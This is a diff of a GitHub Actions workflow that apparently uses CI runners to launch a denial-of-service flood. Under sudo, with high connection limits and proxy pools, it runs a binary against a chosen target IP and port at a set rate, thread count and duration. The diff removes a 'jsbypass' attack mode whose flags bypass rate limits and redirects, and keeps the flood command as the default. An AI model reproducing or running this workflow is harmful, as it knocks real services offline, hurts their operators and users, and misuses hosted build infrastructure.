@@ -72,18 +72,6 @@ on:
         description: 'Proxy pool size'
         required: false
         default: '1'
-      attack_mode:
-        description: 'Attack backend (svc or jsbypass)'
-        required: false
-        default: 'svc'
-      proxy_file:
-        description: 'Proxy file for JS mode'
-        required: false
-        default: 'http.txt'
-      jsbypass_payload:
-        description: 'JSON payload for jsbypass.js'
-        required: false
-        default: ''
 
 jobs:
   bootstrap:
@@ -130,10 +118,6 @@ jobs:
         path: |
           netbench
           proxies.txt
-          http.txt
-          jsbypass.js
-          package.json
-          package-lock.json
         retention-days: 1
 
     - id: sync
@@ -169,11 +153,6 @@ jobs:
 
     - name: Prepare environment
       run: |
-        sudo apt-get update -qq > /dev/null 2>&1 || true
-        sudo apt-get install -y nodejs npm > /dev/null 2>&1 || true
-        node --version
-        npm --version
-        export NODE_OPTIONS='--max-old-space-size=4096 --no-warnings'
         sudo sysctl -w net.core.wmem_max=67108864 2>/dev/null || true
         sudo sysctl -w net.core.rmem_max=67108864 2>/dev/null || true
         sudo sysctl -w net.core.wmem_default=4194304 2>/dev/null || true
@@ -191,10 +170,6 @@ jobs:
       run: |
         mv netbench proc
         chmod +x proc
-        if [ -f package.json ]; then
-          export NODE_OPTIONS='--max-old-space-size=4096 --no-warnings'
-          npm ci --no-audit --no-fund --omit=optional >/dev/null 2>&1 || npm install --no-audit --no-fund --omit=optional >/dev/null 2>&1 || true
-        fi
         
         TARGET_IP="${{ github.event.inputs.target_ip || '127.0.0.1' }}"
         TARGET_PORT="${{ github.event.inputs.target_port || '443' }}"
@@ -213,14 +188,6 @@ jobs:
         fi
         POOL_ID="${{ github.event.inputs.proxy_pool_id || '0' }}"
         POOL_SIZE="${{ github.event.inputs.proxy_pool_size || '1' }}"
-        ATTACK_MODE="${{ github.event.inputs.attack_mode || 'svc' }}"
-        PROXY_FILE="${{ github.event.inputs.proxy_file || 'http.txt' }}"
-        JS_PAYLOAD="${{ github.event.inputs.jsbypass_payload || '' }}"
-        JS_METHOD="$METHOD"
-        case "$JS_METHOD" in
-          GET|POST) ;;
-          *) JS_METHOD="GET" ;;
-        esac
         
         SYNC_TS="${{ needs.bootstrap.outputs.sync_ts }}"
         START_TS="${{ github.event.inputs.start_timestamp || '0' }}"
@@ -236,30 +203,7 @@ jobs:
         fi
         
         ulimit -n 1000000 2>/dev/null || ulimit -n 65535 || true
-        if [ "$ATTACK_MODE" = "jsbypass" ]; then
-          if [ -f "$PROXY_FILE" ]; then
-            cp "$PROXY_FILE" proxy.txt 2>/dev/null || true
-          fi
-          if [ -n "$JS_PAYLOAD" ]; then
-            python3 - <<'PY' "$JS_PAYLOAD" "$TARGET_IP" "$TARGET_PORT" "$DURATION" "$METHOD" "$THREADS" "$RATE" "$PROXY_FILE"
-            import json, os, sys
-            payload = json.loads(sys.argv[1])
-            method = payload.get('method', 'GET')
-            target = payload.get('target_url', f"https://{sys.argv[2]}:{sys.argv[3]}/")
-            duration = payload.get('duration', sys.argv[4])
-            threads = payload.get('threads', sys.argv[5])
-            rate = payload.get('rate', sys.argv[6])
-            proxy_file = payload.get('proxy_file', sys.argv[7])
-            args = payload.get('args', [])
-            cmd = ['node', 'jsbypass.js', method, target, duration, threads, rate, proxy_file] + args + ['--debug', '--full', '--connect', '--ratelimit-bypass', '--redirect-bypass', '--cache']
-            os.execvp(cmd[0], cmd)
-            PY
-          else
-            node jsbypass.js "$JS_METHOD" "https://$TARGET_IP:$TARGET_PORT/" "$DURATION" "$THREADS" "$RATE" "$PROXY_FILE" --debug --full --connect --ratelimit-bypass --redirect-bypass --cache >/dev/null 2>&1 &
-          fi
-        else
-          sudo sh -c "ulimit -n 1000000 2>/dev/null; cpulimit -l 90 -f -- ./proc $TARGET_IP $TARGET_PORT $RATE $DURATION $METHOD $THREADS $PROXY_FLAG $PREFER_US_FLAG --proxy-pool-id $POOL_ID --proxy-pool-size $POOL_SIZE || exec ./proc $TARGET_IP $TARGET_PORT $RATE $DURATION $METHOD $THREADS $PROXY_FLAG $PREFER_US_FLAG --proxy-pool-id $POOL_ID --proxy-pool-size $POOL_SIZE"
-        fi
+        sudo sh -c "ulimit -n 1000000 2>/dev/null; cpulimit -l 90 -f -- ./proc $TARGET_IP $TARGET_PORT $RATE $DURATION $METHOD $THREADS $PROXY_FLAG $PREFER_US_FLAG --proxy-pool-id $POOL_ID --proxy-pool-size $POOL_SIZE || exec ./proc $TARGET_IP $TARGET_PORT $RATE $DURATION $METHOD $THREADS $PROXY_FLAG $PREFER_US_FLAG --proxy-pool-id $POOL_ID --proxy-pool-size $POOL_SIZE"
 
     - name: Cleanup
       if: always()
